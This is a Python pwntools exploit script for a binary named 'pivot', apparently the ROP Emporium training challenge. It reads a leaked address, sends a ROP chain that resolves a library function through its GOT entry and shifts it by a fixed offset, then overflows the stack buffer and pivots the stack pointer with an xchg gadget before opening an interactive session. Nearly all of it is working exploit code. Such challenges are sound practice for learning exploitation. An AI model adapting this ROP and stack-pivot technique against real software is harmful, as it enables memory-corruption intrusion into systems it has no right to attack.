#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template pivot
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pivot')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  '.'

"""
0x00000000004009c0:	mov rax,QWORD PTR [rax]
0x00000000004009bd:	xchg   rsp,rax
0x00000000004009bb: pop rax; ret; 
0x00000000004009c4: add rax, rbp; ret; 
0x00000000004007c8: pop rbp; ret; 
0x00000000004006b0: call rax; 

"""

io = start()

io.recvuntil("pivot:")
addr = int(io.recvuntil('\n')[:-1], 16)
print("addr: ", hex(addr))


foothold_plt = p64(0x400720)
foothold_got = p64(0x601040)
pop_rax = p64(0x00000000004009bb)
pop_rbp = p64(0x00000000004007c8)
add_rax_rbp = p64(0x00000000004009c4)
xchg_rsp_rax = p64(0x00000000004009bd)
mov_rax = p64(0x00000000004009c0)
call_rax = p64(0x00000000004006b0)

io.recvuntil("> ")

buf = ""
buf += foothold_plt
buf += pop_rax
buf += foothold_got
buf += mov_rax
buf += pop_rbp
buf += p64(0x117)
buf += add_rax_rbp
buf += call_rax

io.sendline(buf)

io.recvuntil("> ")

s = ""
s += "A"*40
s += pop_rax
s += p64(addr)
s += xchg_rsp_rax

write("in.txt", buf)

io.sendline(s)
#print(io.recvall())
io.interactive()

